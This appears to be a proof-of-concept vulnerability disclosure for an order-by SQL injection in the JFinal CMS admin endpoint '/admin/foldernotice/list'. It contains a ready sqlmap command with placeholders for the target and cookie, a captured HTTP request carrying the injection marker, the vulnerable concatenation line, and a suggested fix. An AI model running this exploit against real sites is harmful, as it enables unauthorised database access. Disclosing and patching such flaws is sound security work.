# POC

First of all  you should install sqlmap

you need set 

- target domain or IP
- your cookie

the run the shell

```
sqlmap -u http://targetDomainOrIP/jfinal_cms/jfinal_cms/admin/foldernotice/list  --thread 8 --batch --smart  --random-agent --data "form.orderColumn=*&form.orderAsc=&form.orderColumn=&form.orderAsc=&attr.folder_id=258&totalRecords=0&pageNo=1&pageSize=20&length=10"  --cookie "  your cookie  " --current-db
```

![image-20220730054002852](image-20220730054002852.png)

Sometimes  you should know that  the /jfinal_cms/    is not necessary ,you need juede the route

# principle

you can see the code of interface   /system/menu/list

```
sql.append(" order by ").append(orderBy);
```

There is a sql statement directly spliced

what is more 

There is no measure to prevent sql injection because sql injection is required here

# solution

By analyzing this function point, I found that the injection of orderby is fixed, such as id, name, menu key, so you can try to use parameterized query or make a whitelist





# my Test

```
POST /jfinal_cms/admin/foldernotice/list HTTP/1.1
Host: 172.30.48.1
Content-Length: 130
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://172.30.48.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://172.30.48.1/jfinal_cms/admin/home
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=BF13B42EDFC3DEC180959D6DF143BD18; Hm_lvt_1040d081eea13b44d84a4af639640d51=1659122360; session_user="wgPmpe3hEuJWIL+I+kHtxqag1wutWsMhm6eaAgoJH0c="
Connection: close

form.orderColumn=*&form.orderAsc=&form.orderColumn=&form.orderAsc=&attr.folder_id=258&totalRecords=0&pageNo=1&pageSize=20&length=10
```

